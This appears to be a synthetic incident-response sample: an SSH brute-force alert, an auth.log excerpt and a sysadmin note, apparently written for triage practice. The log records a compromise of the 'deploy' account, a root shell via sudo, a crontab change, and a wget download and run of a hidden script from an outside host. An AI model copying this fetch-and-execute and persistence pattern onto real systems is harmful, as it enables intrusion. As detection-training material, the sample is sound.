@@ -1,0 +1,26 @@
+SYNTHETIC SAMPLE - fictional data for demonstration only. IPs use documentation ranges.
+
+MONITORING ALERT SSH-BF-01 on web-01: 12 failed SSH logins from one source within 3 minutes.
+
+--- /var/log/auth.log (excerpt, host web-01) ---
+Oct 10 02:14:03 web-01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 52814 ssh2
+Oct 10 02:14:09 web-01 sshd[2213]: Failed password for invalid user test from 198.51.100.23 port 52820 ssh2
+Oct 10 02:14:15 web-01 sshd[2215]: Failed password for invalid user oracle from 198.51.100.23 port 52833 ssh2
+Oct 10 02:14:21 web-01 sshd[2217]: Failed password for invalid user ubuntu from 198.51.100.23 port 52847 ssh2
+Oct 10 02:14:28 web-01 sshd[2219]: Failed password for root from 198.51.100.23 port 52861 ssh2
+Oct 10 02:14:34 web-01 sshd[2221]: Failed password for root from 198.51.100.23 port 52872 ssh2
+Oct 10 02:14:41 web-01 sshd[2223]: Failed password for invalid user postgres from 198.51.100.23 port 52890 ssh2
+Oct 10 02:14:47 web-01 sshd[2225]: Failed password for invalid user git from 198.51.100.23 port 52903 ssh2
+Oct 10 02:15:52 web-01 sshd[2251]: Failed password for deploy from 198.51.100.23 port 53011 ssh2
+Oct 10 02:16:04 web-01 sshd[2263]: Failed password for deploy from 198.51.100.23 port 53102 ssh2
+Oct 10 02:16:20 web-01 sshd[2277]: Failed password for deploy from 198.51.100.23 port 53215 ssh2
+Oct 10 02:16:44 web-01 sshd[2290]: Failed password for deploy from 198.51.100.23 port 53311 ssh2
+Oct 10 02:17:09 web-01 sshd[2301]: Accepted password for deploy from 198.51.100.23 port 53420 ssh2
+Oct 10 02:17:10 web-01 sshd[2301]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Oct 10 02:18:31 web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Oct 10 02:19:48 web-01 crontab[2377]: (root) REPLACE (root)
+Oct 10 02:20:15 web-01 wget: saved http://203.0.113.77/update.sh to /tmp/.update.sh
+Oct 10 02:20:19 web-01 audit: EXECVE a0="bash" a1="/tmp/.update.sh"
+Oct 10 02:24:55 web-01 sshd[2301]: pam_unix(sshd:session): session closed for user deploy
+
+NOTE from sysadmin: the "deploy" account is used by our CI system, which normally connects from 192.0.2.40 only.
